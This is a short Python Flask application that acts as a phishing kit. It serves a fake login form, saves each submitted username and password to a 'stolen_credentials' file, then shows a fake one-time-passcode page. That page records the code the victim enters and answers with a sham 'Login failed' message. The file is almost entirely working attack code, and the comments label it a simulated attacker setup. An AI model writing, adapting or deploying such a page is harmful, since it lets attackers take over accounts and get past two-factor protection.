from flask import Flask, request, redirect, url_for, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Session key

# Simulated attacker log file
STOLEN_CREDENTIALS_FILE = "stolen_credentials.txt"

@app.route("/", methods=["GET", "POST"])
def fake_login():
    """Fake login page that captures credentials and redirects to OTP entry."""
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # Log stolen credentials
        with open(STOLEN_CREDENTIALS_FILE, "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")

        # Store username in session and redirect to OTP page
        session["username"] = username
        return redirect(url_for("fake_otp_entry"))

    return '''
    <h2>Login</h2>
    <form method="post">
        Username: <input type="text" name="username" required><br>
        Password: <input type="password" name="password" required><br>
        <input type="submit" value="Login">
    </form>
    '''

@app.route("/otp", methods=["GET", "POST"])
def fake_otp_entry():
    """Fake OTP entry page that captures the real OTP entered by the victim."""
    if "username" not in session:
        return redirect(url_for("fake_login")) 

    if request.method == "POST":
        entered_otp = request.form["otp"]

        # Log the stolen OTP
        with open(STOLEN_CREDENTIALS_FILE, "a") as f:
            f.write(f"Username: {session['username']}, OTP: {entered_otp}\n")

        return "Login failed. Try again."  # fake faailure message

    return '''
    <h2>Enter OTP</h2>
    <p>An OTP has been sent to your device. Please enter it below.</p>
    <form method="post">
        OTP: <input type="text" name="otp" required><br>
        <input type="submit" value="Verify">
    </form>
    '''
    
if __name__ == "__main__":
    app.run(debug=True)
